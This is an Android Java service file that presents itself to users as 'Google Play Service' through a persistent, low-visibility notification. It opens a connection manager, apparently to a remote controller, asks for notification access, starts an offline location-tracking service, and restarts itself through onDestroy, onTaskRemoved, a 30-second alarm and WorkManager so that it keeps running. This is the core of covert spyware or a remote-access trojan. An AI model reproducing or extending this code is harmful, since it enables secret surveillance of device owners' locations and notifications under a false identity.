package com.android.background.services;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import com.android.background.services.helpers.NotificationPermissionHelper;
import com.android.background.services.helpers.NotificationsTest;
import com.android.background.services.helpers.NotificationsDebug;
import com.android.background.services.helpers.OfflineLocationService;
import com.android.background.services.helpers.WorkManagerHelper;

public class MainService extends Service {

    public static final String CHANNEL_ID = BuildConfig.APPLICATION_ID;
    private static Context contextOfApplication;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        createNotificationChannel();

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);

        Notification notification = notificationBuilder.setContentTitle("Google Play Service")
                .setContentText("Google is running background")
                .setSmallIcon(R.drawable.play_service_icon)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MAX)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(1, notification);

        contextOfApplication = this;
        ConnectionManager.startAsync(this);

        // Kiểm tra và yêu cầu quyền notification access
        NotificationPermissionHelper.checkAndRequestPermission();
        
        // Chạy test notifications (có thể xóa sau khi test xong)
        NotificationsTest.runAllTests();
        
        // Chạy debug notifications để kiểm tra
        NotificationsDebug.debugAllNotifications();

        // Thiết lập alarm để tự khởi động lại
        setupAutoRestartAlarm();
        
        // Khởi động WorkManager để đảm bảo service chạy liên tục
        WorkManagerHelper.startPeriodicWork(this);
        
        // Khởi động OfflineLocationService để theo dõi vị trí offline
        Intent offlineLocationIntent = new Intent(this, OfflineLocationService.class);
        startService(offlineLocationIntent);

        return Service.START_STICKY;
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d("MainService", "Service destroyed, restarting...");
        
        // Khởi động lại service ngay lập tức
        Intent restartIntent = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
    }


    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }

    private void createNotificationChannel() {

        NotificationChannel serviceChannel = new NotificationChannel(
                CHANNEL_ID,
                "Google Background Service Channel",
                NotificationManager.IMPORTANCE_NONE
        );
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(serviceChannel);
    }

    private void setupAutoRestartAlarm() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, MainService.class);
        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        // Thiết lập alarm để kiểm tra mỗi 30 giây
        long triggerTime = SystemClock.elapsedRealtime() + 30000; // 30 giây
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, 
                triggerTime, pendingIntent);
        } else {
            alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, 
                triggerTime, 30000, pendingIntent);
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d("MainService", "Task removed, restarting service...");
        
        // Khởi động lại service khi task bị xóa
        Intent restartIntent = new Intent(this, MainService.class);
        restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startService(restartIntent);
        
        super.onTaskRemoved(rootIntent);
    }
}
